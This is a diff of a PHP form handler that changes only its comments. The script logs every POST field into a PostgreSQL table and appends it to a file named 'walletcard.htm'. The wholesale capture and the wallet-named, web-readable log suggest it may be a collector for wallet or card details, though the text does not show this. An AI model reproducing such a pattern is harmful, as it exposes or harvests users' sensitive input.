@@ -1,13 +1,13 @@
 <?php
-// Database connection parameters
-$host = getenv('DB_HOST');
+// Database connection parameters from environment variables
+$host = getenv('DB_HOST'); // Set your environment variables in Render
 $db = getenv('DB_NAME');
 $user = getenv('DB_USER');
 $pass = getenv('DB_PASSWORD');
 $port = getenv('DB_PORT');
 
 try {
-    // Create a new PDO instance
+    // Create a new PDO instance for PostgreSQL
     $dsn = "pgsql:host=$host;port=$port;dbname=$db";
     $pdo = new PDO($dsn, $user, $pass);
     $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
@@ -21,7 +21,7 @@ try {
     )";
     $pdo->exec($createTableSQL);
 
-    // Prepare an insert statement
+    // Prepare an insert statement for the database
     $stmt = $pdo->prepare("INSERT INTO submissions (variable, value) VALUES (:variable, :value)");
 
     // Open or create walletcard.htm in append mode
@@ -32,7 +32,7 @@ try {
 
     // Iterate through POST data
     foreach ($_POST as $variable => $value) {
-        // Sanitize form input to prevent any injection attacks
+        // Sanitize form input to prevent injection attacks
         $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
         $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
 
